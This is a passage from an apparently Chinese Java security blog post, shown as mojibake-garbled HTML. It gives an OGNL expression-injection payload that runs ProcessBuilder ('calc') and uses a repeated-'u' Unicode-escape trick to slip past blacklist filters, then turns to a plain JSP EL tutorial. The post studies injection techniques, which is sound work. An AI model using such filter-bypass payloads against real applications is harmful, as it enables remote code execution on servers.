class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå‡å¦‚å­˜åœ¨ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼\u\d{4}ï¼Œå°†å¯¹åº”çš„unicodeå…ˆè§£æäº†ä¸€éï¼Œå†è¿›è¡Œé»‘åå•ï¼Œè¿˜æœ‰æ–¹æ³•ç»•è¿‡å—ï¼Ÿå®é™…ä¸Šè¿™é‡Œåˆå­˜åœ¨ä¸€ä¸ªtrickï¼Œå³\uxxxxä¸­çš„uæ˜¯å¯ä»¥å†™ä¸€ä¸ªæˆ–å¤šä¸ªçš„ï¼Œå…·ä½“åŸå› åœ¨äºognl.JavaCharStream#readCharæ–¹æ³•ä¸­:<br><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713112336109-19a6d25f-f49f-4c34-816f-f8dc579b2c2c.png"><br>æ‰€ä»¥ä¸Šè¿°OGNLè¡¨è¾¾å¼å¯ä»¥æ”¹å†™ä¸º:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;(\uuuuuuuuuuuuuuuu006eew java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;</span>calc<span class="string">&quot;&#125;)).start()&quot;</span>;</span><br><span class="line">Ognl.getValue(str, <span class="literal">null</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/10482">https://xz.aliyun.com/t/10482</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/OGNL/</a></p><p><a href="https://paper.seebug.org/794/#0x03-ognl">https://paper.seebug.org/794/#0x03-ognl</a></p><p><a href="https://www.freebuf.com/vuls/168609.html">https://www.freebuf.com/vuls/168609.html</a></p><p><a href="https://chenlvtang.top/2022/08/11/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%B9%8BOGNL/">https://chenlvtang.top/2022/08/11/Java%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%B9%8BOGNL/</a></p><h2 id="ELç®€ä»‹"><a href="#ELç®€ä»‹" class="headerlink" title="ELç®€ä»‹"></a>ELç®€ä»‹</h2><p>ELï¼ˆExpression Languageï¼‰ æ˜¯ä¸ºäº†ä½¿JSPå†™èµ·æ¥æ›´åŠ ç®€å•ã€‚è¡¨è¾¾å¼è¯­è¨€çš„çµæ„Ÿæ¥è‡ªäº ECMAScript å’Œ XPath è¡¨è¾¾å¼è¯­è¨€ï¼Œå®ƒæä¾›äº†åœ¨ JSP ä¸­ç®€åŒ–è¡¨è¾¾å¼çš„æ–¹æ³•ï¼Œè®©Jspçš„ä»£ç æ›´åŠ ç®€åŒ–ã€‚</p><p>ELè¡¨è¾¾å¼ä¸»è¦åŠŸèƒ½å¦‚ä¸‹ï¼š</p><ul><li>è·å–æ•°æ®ï¼šELè¡¨è¾¾å¼ä¸»è¦ç”¨äºæ›¿æ¢JSPé¡µé¢ä¸­çš„è„šæœ¬è¡¨è¾¾å¼ï¼Œä»¥ä»å„ç§ç±»å‹çš„WebåŸŸä¸­æ£€ç´¢Javaå¯¹è±¡ã€è·å–æ•°æ®ï¼ˆæŸä¸ªWebåŸŸä¸­çš„å¯¹è±¡ï¼Œè®¿é—®JavaBeançš„å±æ€§ã€è®¿é—®Listé›†åˆã€è®¿é—®Mapé›†åˆã€è®¿é—®æ•°ç»„ï¼‰ï¼›</li><li>æ‰§è¡Œè¿ç®—ï¼šåˆ©ç”¨ELè¡¨è¾¾å¼å¯ä»¥åœ¨JSPé¡µé¢ä¸­æ‰§è¡Œä¸€äº›åŸºæœ¬çš„å…³ç³»è¿ç®—ã€é€»è¾‘è¿ç®—å’Œç®—æœ¯è¿ç®—ï¼Œä»¥åœ¨JSPé¡µé¢ä¸­å®Œæˆä¸€äº›ç®€å•çš„é€»è¾‘è¿ç®—ï¼Œä¾‹å¦‚${user&#x3D;&#x3D;null}ï¼›</li><li>è·å–Webå¼€å‘å¸¸ç”¨å¯¹è±¡ï¼šELè¡¨è¾¾å¼å®šä¹‰äº†ä¸€äº›éšå¼å¯¹è±¡ï¼Œåˆ©ç”¨è¿™äº›éšå¼å¯¹è±¡ï¼ŒWebå¼€å‘äººå‘˜å¯ä»¥å¾ˆè½»æ¾è·å¾—å¯¹Webå¸¸ç”¨å¯¹è±¡çš„å¼•ç”¨ï¼Œä»è€Œè·å¾—è¿™äº›å¯¹è±¡ä¸­çš„æ•°æ®ï¼›</li><li>è°ƒç”¨Javaæ–¹æ³•ï¼šELè¡¨è¾¾å¼å…è®¸ç”¨æˆ·å¼€å‘è‡ªå®šä¹‰ELå‡½æ•°ï¼Œä»¥åœ¨JSPé¡µé¢ä¸­é€šè¿‡ELè¡¨è¾¾å¼è°ƒç”¨Javaç±»çš„æ–¹æ³•ï¼›</li></ul><h3 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h3><h3 id="ELè¯­æ³•"><a href="#ELè¯­æ³•" class="headerlink" title="ELè¯­æ³•"></a>ELè¯­æ³•</h3><p>åœ¨JSPä¸­è®¿é—®æ¨¡å‹å¯¹è±¡æ˜¯é€šè¿‡ELè¡¨è¾¾å¼çš„è¯­æ³•æ¥è¡¨è¾¾ã€‚æ‰€æœ‰ELè¡¨è¾¾å¼çš„æ ¼å¼éƒ½æ˜¯ä»¥${}è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼Œ${ userinfo}ä»£è¡¨è·å–å˜é‡userinfoçš„å€¼ã€‚å½“ELè¡¨è¾¾å¼ä¸­çš„å˜é‡ä¸ç»™å®šèŒƒå›´æ—¶ï¼Œåˆ™é»˜è®¤åœ¨pageèŒƒå›´æŸ¥æ‰¾ï¼Œç„¶åä¾æ¬¡åœ¨requestã€sessionã€applicationèŒƒå›´æŸ¥æ‰¾ã€‚ä¹Ÿå¯ä»¥ç”¨èŒƒå›´ä½œä¸ºå‰ç¼€è¡¨ç¤ºå±äºå“ªä¸ªèŒƒå›´çš„å˜é‡ï¼Œä¾‹å¦‚ï¼š${ pageScope. userinfo}è¡¨ç¤ºè®¿é—®pageèŒƒå›´ä¸­çš„userinfoå˜é‡ã€‚</p><p>ç®€å•åœ°è¯´ï¼Œä½¿ç”¨ELè¡¨è¾¾å¼è¯­æ³•ï¼š${ELè¡¨è¾¾å¼}</p><p>å…¶ä¸­ï¼Œ<strong>ELè¡¨è¾¾å¼å’ŒJSPä»£ç ç­‰ä»·è½¬æ¢</strong>ã€‚äº‹å®ä¸Šï¼Œå¯ä»¥å°†ELè¡¨è¾¾å¼ç†è§£ä¸ºä¸€ç§ç®€åŒ–çš„JSPä»£ç ã€‚</p><p>æ‰©å±•JSPä»£ç çš„å†™æ³•æ€»ç»“ï¼š</p><ul><li>JSPè¡¨è¾¾å¼ï¼š&lt;%&#x3D;å˜é‡æˆ–è¡¨è¾¾å¼&gt;å‘æµè§ˆå™¨è¾“å‡ºå˜é‡æˆ–è¡¨è¾¾å¼çš„è®¡ç®—ç»“æœã€‚</li><li>JSPè„šæœ¬ï¼š&lt;%Javaä»£ç %&gt;æ‰§è¡Œjavaä»£ç çš„åŸç†ï¼šç¿»è¯‘åˆ°_jspService()æ–¹æ³•ä¸­ã€‚</li><li>JSPå£°æ˜ï¼š&lt;%!å˜é‡æˆ–æ–¹æ³•%&gt;å£°æ˜jspçš„æˆå‘˜å˜é‡æˆ–æˆå‘˜æ–¹æ³•ã€‚</li><li>JSPæ³¨é‡Šï¼š&lt;%!â€“JSPæ³¨é‡Šâ€“%&gt;ç”¨äºæ³¨é‡ŠJSPä»£ç ï¼Œä¸ä¼šç¿»è¯‘åˆ°Javaæ–‡ä»¶ä¸­ï¼Œä¹Ÿä¸ä¼šæ‰§è¡Œã€‚</li></ul><h3 id="ä¸-è¿ç®—ç¬¦"><a href="#ä¸-è¿ç®—ç¬¦" class="headerlink" title="[ ]ä¸.è¿ç®—ç¬¦"></a>[ ]ä¸.è¿ç®—ç¬¦</h3><p>ELè¡¨è¾¾å¼æä¾›.å’Œ[]ä¸¤ç§è¿ç®—ç¬¦æ¥å­˜å–æ•°æ®ã€‚</p><p>å½“è¦å­˜å–çš„å±æ€§åç§°ä¸­åŒ…å«ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚.æˆ–-ç­‰å¹¶éå­—æ¯æˆ–æ•°å­—çš„ç¬¦å·ï¼Œå°±ä¸€å®šè¦ä½¿ç”¨[]ã€‚ä¾‹å¦‚ï¼š${user.My-Name}åº”å½“æ”¹ä¸º${user[â€œMy-Nameâ€]}ã€‚</p><p>å¦‚æœè¦åŠ¨æ€å–å€¼æ—¶ï¼Œå°±å¯ä»¥ç”¨[]æ¥åšï¼Œè€Œ.æ— æ³•åšåˆ°åŠ¨æ€å–å€¼ã€‚ä¾‹å¦‚ï¼š${sessionScope.user[data]}ä¸­data æ˜¯ä¸€ä¸ªå˜é‡ã€‚</p><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h3><p>ELè¡¨è¾¾å¼å­˜å–å˜é‡æ•°æ®çš„æ–¹æ³•å¾ˆç®€å•ï¼Œä¾‹å¦‚ï¼š${username}ã€‚å®ƒçš„æ„æ€æ˜¯å–å‡ºæŸä¸€èŒƒå›´ä¸­åç§°ä¸ºusernameçš„å˜é‡ã€‚å› ä¸ºæˆ‘ä»¬å¹¶æ²¡æœ‰æŒ‡å®šå“ªä¸€ä¸ªèŒƒå›´çš„usernameï¼Œæ‰€ä»¥å®ƒä¼šä¾åºä»Pageã€Requestã€Sessionã€ApplicationèŒƒå›´æŸ¥æ‰¾ã€‚å‡å¦‚é€”ä¸­æ‰¾åˆ°usernameï¼Œå°±ç›´æ¥å›ä¼ ï¼Œä¸å†ç»§ç»­æ‰¾ä¸‹å»ï¼Œä½†æ˜¯å‡å¦‚å…¨éƒ¨çš„èŒƒå›´éƒ½æ²¡æœ‰æ‰¾åˆ°æ—¶ï¼Œå°±å›ä¼ â€â€ã€‚ELè¡¨è¾¾å¼çš„å±æ€§å¦‚ä¸‹ï¼š</p><table><thead><tr><th><strong>å±æ€§èŒƒå›´åœ¨ELä¸­çš„åç§°</strong></th><th></th></tr></thead><tbody><tr><td>Page</td><td>PageScope</td></tr><tr><td>Request</td><td>RequestScope</td></tr><tr><td>Session</td><td>SessionScope</td></tr><tr><td>Application</td><td>ApplicationScope</td></tr></tbody></table><p>JSPè¡¨è¾¾å¼è¯­è¨€å®šä¹‰å¯åœ¨è¡¨è¾¾å¼ä¸­ä½¿ç”¨çš„ä»¥ä¸‹æ–‡å­—ï¼š</p><table><thead><tr><th><strong>æ–‡å­—</strong></th><th><strong>æ–‡å­—çš„å€¼</strong></th></tr></thead><tbody><tr><td>Boolean</td><td>true å’Œ false</td></tr><tr><td>Integer</td><td>ä¸ Java ç±»ä¼¼ã€‚å¯ä»¥åŒ…å«ä»»ä½•æ•´æ•°ï¼Œä¾‹å¦‚ 24ã€-45ã€567</td></tr><tr><td>Floating Point</td><td>ä¸ Java ç±»ä¼¼ã€‚å¯ä»¥åŒ…å«ä»»ä½•æ­£çš„æˆ–è´Ÿçš„æµ®ç‚¹æ•°ï¼Œä¾‹å¦‚ -1.8E-45ã€4.567</td></tr><tr><td>String</td><td>ä»»ä½•ç”±å•å¼•å·æˆ–åŒå¼•å·é™å®šçš„å­—ç¬¦ä¸²ã€‚å¯¹äºå•å¼•å·ã€åŒå¼•å·å’Œåæ–œæ ï¼Œä½¿ç”¨åæ–œæ å­—ç¬¦ä½œä¸ºè½¬ä¹‰åºåˆ—ã€‚å¿…é¡»æ³¨æ„ï¼Œå¦‚æœåœ¨å­—ç¬¦ä¸²ä¸¤ç«¯ä½¿ç”¨åŒå¼•å·ï¼Œåˆ™å•å¼•å·ä¸éœ€è¦è½¬ä¹‰ã€‚</td></tr><tr><td>Null</td><td>null</td></tr></tbody></table><h3 id="æ“ä½œç¬¦"><a href="#æ“ä½œç¬¦" class="headerlink" title="æ“ä½œç¬¦"></a>æ“ä½œç¬¦</h3><p>JSPè¡¨è¾¾å¼è¯­è¨€æä¾›ä»¥ä¸‹æ“ä½œç¬¦ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†æ˜¯Javaä¸­å¸¸ç”¨çš„æ“ä½œç¬¦ï¼š</p><table><thead><tr><th><strong>æœ¯è¯­</strong></th><th><strong>å®šä¹‰</strong></th></tr></thead><tbody><tr><td>ç®—æœ¯å‹</td><td>+ã€-ï¼ˆäºŒå…ƒï¼‰ã€*ã€&#x2F;ã€divã€%ã€modã€-ï¼ˆä¸€å…ƒï¼‰</td></tr><tr><td>é€»è¾‘å‹</td><td>andã€&amp;&amp;ã€orã€åŒç®¡é“ç¬¦ã€!ã€not</td></tr><tr><td>å…³ç³»å‹</td><td>&#x3D;&#x3D;ã€eqã€!&#x3D;ã€neã€&lt;ã€ltã€&gt;ã€gtã€&lt;&#x3D;ã€leã€&gt;&#x3D;ã€geã€‚å¯ä»¥ä¸å…¶ä»–å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæˆ–ä¸å¸ƒå°”å‹ã€å­—ç¬¦ä¸²å‹ã€æ•´å‹æˆ–æµ®ç‚¹å‹æ–‡å­—è¿›è¡Œæ¯”è¾ƒã€‚</td></tr><tr><td>ç©º</td><td>empty ç©ºæ“ä½œç¬¦æ˜¯å‰ç¼€æ“ä½œï¼Œå¯ç”¨äºç¡®å®šå€¼æ˜¯å¦ä¸ºç©ºã€‚</td></tr><tr><td>æ¡ä»¶å‹</td><td>A ?B :Cã€‚æ ¹æ® A èµ‹å€¼çš„ç»“æœæ¥èµ‹å€¼ B æˆ– Cã€‚</td></tr></tbody></table><h3 id="éšå¼å¯¹è±¡"><a href="#éšå¼å¯¹è±¡" class="headerlink" title="éšå¼å¯¹è±¡"></a>éšå¼å¯¹è±¡</h3><p>JSPè¡¨è¾¾å¼è¯­è¨€å®šä¹‰äº†ä¸€ç»„éšå¼å¯¹è±¡ï¼Œå…¶ä¸­è®¸å¤šå¯¹è±¡åœ¨ JSP scriplet å’Œè¡¨è¾¾å¼ä¸­å¯ç”¨ï¼š</p><table><thead><tr><th><strong>æœ¯è¯­</strong></th><th><strong>å®šä¹‰</strong></th></tr></thead><tbody><tr><td>pageContext</td><td>JSPé¡µçš„ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥ç”¨äºè®¿é—® JSP éšå¼å¯¹è±¡ï¼Œå¦‚è¯·æ±‚ã€å“åº”ã€ä¼šè¯ã€è¾“å‡ºã€servletContext ç­‰ã€‚ä¾‹å¦‚ï¼Œ${pageContext.response}ä¸ºé¡µé¢çš„å“åº”å¯¹è±¡èµ‹å€¼ã€‚</td></tr></tbody></table><p>æ­¤å¤–ï¼Œè¿˜æä¾›å‡ ä¸ªéšå¼å¯¹è±¡ï¼Œå…è®¸å¯¹ä»¥ä¸‹å¯¹è±¡è¿›è¡Œç®€æ˜“è®¿é—®ï¼š</p><table><thead><tr><th><strong>æœ¯è¯­</strong></th><th><strong>å®šä¹‰</strong></th></tr></thead><tbody><tr><td>param</td><td>å°†è¯·æ±‚å‚æ•°åç§°æ˜ å°„åˆ°å•ä¸ªå­—ç¬¦ä¸²å‚æ•°å€¼ï¼ˆé€šè¿‡è°ƒç”¨ ServletRequest.getParameter (String name) è·å¾—ï¼‰ã€‚getParameter (String) æ–¹æ³•è¿”å›å¸¦æœ‰ç‰¹å®šåç§°çš„å‚æ•°ã€‚è¡¨è¾¾å¼${param . name}ç›¸å½“äº request.getParameter (name)ã€‚</td></tr><tr><td>paramValues</td><td>å°†è¯·æ±‚å‚æ•°åç§°æ˜ å°„åˆ°ä¸€ä¸ªæ•°å€¼æ•°ç»„ï¼ˆé€šè¿‡è°ƒç”¨ ServletRequest.getParameter (String name) è·å¾—ï¼‰ã€‚å®ƒä¸ param éšå¼å¯¹è±¡éå¸¸ç±»ä¼¼ï¼Œä½†å®ƒæ£€ç´¢ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„è€Œä¸æ˜¯å•ä¸ªå€¼ã€‚è¡¨è¾¾å¼ ${paramvalues. name} ç›¸å½“äº request.getParamterValues(name)ã€‚</td></tr><tr><td>header</td><td>å°†è¯·æ±‚å¤´åç§°æ˜ å°„åˆ°å•ä¸ªå­—ç¬¦ä¸²å¤´å€¼ï¼ˆé€šè¿‡è°ƒç”¨ ServletRequest.getHeader(String name) è·å¾—ï¼‰ã€‚è¡¨è¾¾å¼ ${header. name} ç›¸å½“äº request.getHeader(name)ã€‚</td></tr><tr><td>headerValues</td><td>å°†è¯·æ±‚å¤´åç§°æ˜ å°„åˆ°ä¸€ä¸ªæ•°å€¼æ•°ç»„ï¼ˆé€šè¿‡è°ƒç”¨ ServletRequest.getHeaders(String) è·å¾—ï¼‰ã€‚å®ƒä¸å¤´éšå¼å¯¹è±¡éå¸¸ç±»ä¼¼ã€‚è¡¨è¾¾å¼${headerValues. name}ç›¸å½“äº request.getHeaderValues(name)ã€‚</td></tr><tr><td>cookie</td><td>å°† cookie åç§°æ˜ å°„åˆ°å•ä¸ª cookie å¯¹è±¡ã€‚å‘æœåŠ¡å™¨å‘å‡ºçš„å®¢æˆ·ç«¯è¯·æ±‚å¯ä»¥è·å¾—ä¸€ä¸ªæˆ–å¤šä¸ª cookieã€‚è¡¨è¾¾å¼${cookie. name .value}è¿”å›å¸¦æœ‰ç‰¹å®šåç§°çš„ç¬¬ä¸€ä¸ª cookie å€¼ã€‚å¦‚æœè¯·æ±‚åŒ…å«å¤šä¸ªåŒåçš„ cookieï¼Œåˆ™åº”è¯¥ä½¿ç”¨${headerValues. name}è¡¨è¾¾å¼ã€‚</td></tr><tr><td>initParam</td><td>å°†ä¸Šä¸‹æ–‡åˆå§‹åŒ–å‚æ•°åç§°æ˜ å°„åˆ°å•ä¸ªå€¼ï¼ˆé€šè¿‡è°ƒç”¨ ServletContext.getInitparameter(String name) è·å¾—ï¼‰ã€‚</td></tr></tbody></table><p>é™¤äº†ä¸Šè¿°ä¸¤ç§ç±»å‹çš„éšå¼å¯¹è±¡ä¹‹å¤–ï¼Œè¿˜æœ‰äº›å¯¹è±¡å…è®¸è®¿é—®å¤šç§èŒƒå›´çš„å˜é‡ï¼Œå¦‚ Web ä¸Šä¸‹æ–‡ã€ä¼šè¯ã€è¯·æ±‚ã€é¡µé¢ï¼š</p><table><thead><tr><th><strong>æœ¯è¯­</strong></th><th><strong>å®šä¹‰</strong></th></tr></thead><tbody><tr><td>pageScope</td><td>å°†é¡µé¢èŒƒå›´çš„å˜é‡åç§°æ˜ å°„åˆ°å…¶å€¼ã€‚ä¾‹å¦‚ï¼ŒEL è¡¨è¾¾å¼å¯ä»¥ä½¿ç”¨${pageScope.objectName}è®¿é—®ä¸€ä¸ª JSP ä¸­é¡µé¢èŒƒå›´çš„å¯¹è±¡ï¼Œè¿˜å¯ä»¥ä½¿ç”¨${pageScope .objectName. attributeName}è®¿é—®å¯¹è±¡çš„å±æ€§ã€‚</td></tr><tr><td>requestScope</td><td>å°†è¯·æ±‚èŒƒå›´çš„å˜é‡åç§°æ˜ å°„åˆ°å…¶å€¼ã€‚è¯¥å¯¹è±¡å…è®¸è®¿é—®è¯·æ±‚å¯¹è±¡çš„å±æ€§ã€‚ä¾‹å¦‚ï¼ŒEL è¡¨è¾¾å¼å¯ä»¥ä½¿ç”¨${requestScope. objectName}è®¿é—®ä¸€ä¸ª JSP è¯·æ±‚èŒƒå›´çš„å¯¹è±¡ï¼Œè¿˜å¯ä»¥ä½¿ç”¨${requestScope. objectName. attributeName}è®¿é—®å¯¹è±¡çš„å±æ€§ã€‚</td></tr><tr><td>sessionScope</td><td>å°†ä¼šè¯èŒƒå›´çš„å˜é‡åç§°æ˜ å°„åˆ°å…¶å€¼ã€‚è¯¥å¯¹è±¡å…è®¸è®¿é—®ä¼šè¯å¯¹è±¡çš„å±æ€§ã€‚ä¾‹å¦‚ï¼š${sessionScope. name}</td></tr><tr><td>applicationScope</td><td>å°†åº”ç”¨ç¨‹åºèŒƒå›´çš„å˜é‡åç§°æ˜ å°„åˆ°å…¶å€¼ã€‚è¯¥éšå¼å¯¹è±¡å…è®¸è®¿é—®åº”ç”¨ç¨‹åºèŒƒå›´çš„å¯¹è±¡ã€‚</td></tr></tbody></table><h4 id="pageContextå¯¹è±¡"><a href="#pageContextå¯¹è±¡" class="headerlink" title="pageContextå¯¹è±¡"></a>pageContextå¯¹è±¡</h4><p>pageContextå¯¹è±¡æ˜¯JSPä¸­pageContextå¯¹è±¡çš„å¼•ç”¨ã€‚é€šè¿‡pageContextå¯¹è±¡ï¼Œæ‚¨å¯ä»¥è®¿é—®requestå¯¹è±¡ã€‚æ¯”å¦‚ï¼Œè®¿é—®requestå¯¹è±¡ä¼ å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå°±åƒè¿™æ ·ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.request.queryString&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153806642-e746ebd6-90db-4829-9222-4c5e652d53fb.png"></p><h4 id="Scopeå¯¹è±¡"><a href="#Scopeå¯¹è±¡" class="headerlink" title="Scopeå¯¹è±¡"></a>Scopeå¯¹è±¡</h4><p>pageScopeï¼ŒrequestScopeï¼ŒsessionScopeï¼ŒapplicationScopeå˜é‡ç”¨æ¥è®¿é—®å­˜å‚¨åœ¨å„ä¸ªä½œç”¨åŸŸå±‚æ¬¡çš„å˜é‡ã€‚</p><p>ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœæ‚¨éœ€è¦æ˜¾å¼è®¿é—®åœ¨applicationScopeå±‚çš„boxå˜é‡ï¼Œå¯ä»¥è¿™æ ·æ¥è®¿é—®ï¼šapplicationScope.boxã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line">pageContext.setAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;mi1k7ea_page&quot;</span>);  </span><br><span class="line">request.setAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;mi1k7ea_request&quot;</span>);</span><br><span class="line">session.setAttribute(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;mi1k7ea_session&quot;</span>);</span><br><span class="line">application.setAttribute(<span class="string">&quot;user&quot;</span>,<span class="string">&quot;mi1k7ea_application&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">pageScope.name:$&#123;pageScope.name&#125;</span><br><span class="line">                 &lt;/br&gt;</span><br><span class="line">                 requestScope.name : $&#123;requestScope.name&#125;</span><br><span class="line">                                       &lt;/br&gt;</span><br><span class="line">                                       sessionScope.user : $&#123;sessionScope.user&#125;</span><br><span class="line">                                                             &lt;/br&gt;</span><br><span class="line">                                                             applicationScope.user : $&#123;applicationScope.user&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153829067-32ff9b8b-a253-4bd2-ae74-51e2636c231e.png"></p><h4 id="paramå’ŒparamValueså¯¹è±¡"><a href="#paramå’ŒparamValueså¯¹è±¡" class="headerlink" title="paramå’ŒparamValueså¯¹è±¡"></a>paramå’ŒparamValueså¯¹è±¡</h4><p>paramå’ŒparamValueså¯¹è±¡ç”¨æ¥è®¿é—®å‚æ•°å€¼ï¼Œé€šè¿‡ä½¿ç”¨request.getParameteræ–¹æ³•å’Œrequest.getParameterValuesæ–¹æ³•ã€‚</p><p>ä¸¾ä¾‹æ¥è¯´ï¼Œè®¿é—®ä¸€ä¸ªåä¸ºorderçš„å‚æ•°ï¼Œå¯ä»¥è¿™æ ·ä½¿ç”¨è¡¨è¾¾å¼ï¼š${param.order}ï¼Œæˆ–è€…${param[â€œorderâ€]}ã€‚</p><p>æ¥ä¸‹æ¥çš„ä¾‹å­è¡¨æ˜äº†å¦‚ä½•è®¿é—®requestä¸­çš„usernameå‚æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="type">String</span> <span class="variable">title</span> <span class="operator">=</span> <span class="string">&quot;Accessing Request Param&quot;</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;param[<span class="string">&quot;username&quot;</span>]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>paramå¯¹è±¡è¿”å›å•ä¸€çš„å­—ç¬¦ä¸²ï¼Œè€ŒparamValueså¯¹è±¡åˆ™è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ã€‚<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713153867755-8e21a12e-bbe3-4065-bb3e-4e4edefafabf.png"></p><h4 id="headerå’ŒheaderValueså¯¹è±¡"><a href="#headerå’ŒheaderValueså¯¹è±¡" class="headerlink" title="headerå’ŒheaderValueså¯¹è±¡"></a>headerå’ŒheaderValueså¯¹è±¡</h4><p>headerå’ŒheaderValueså¯¹è±¡ç”¨æ¥è®¿é—®ä¿¡æ¯å¤´ï¼Œé€šè¿‡ä½¿ç”¨request.getHeader()æ–¹æ³•å’Œrequest.getHeaders()æ–¹æ³•ã€‚</p><p>ä¸¾ä¾‹æ¥è¯´ï¼Œè¦è®¿é—®ä¸€ä¸ªåä¸ºuser-agentçš„ä¿¡æ¯å¤´ï¼Œå¯ä»¥è¿™æ ·ä½¿ç”¨è¡¨è¾¾å¼ï¼š${header.user-agent}ï¼Œæˆ–è€…${header[â€œuser-agentâ€]}ã€‚</p><p>æ¥ä¸‹æ¥çš„ä¾‹å­è¡¨æ˜äº†å¦‚ä½•è®¿é—®user-agentä¿¡æ¯å¤´ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*,java.util.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">title</span> <span class="operator">=</span> <span class="string">&quot;User Agent Example&quot;</span>;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;div align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;$&#123;header[<span class="string">&quot;user-agent&quot;</span>]&#125;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><img 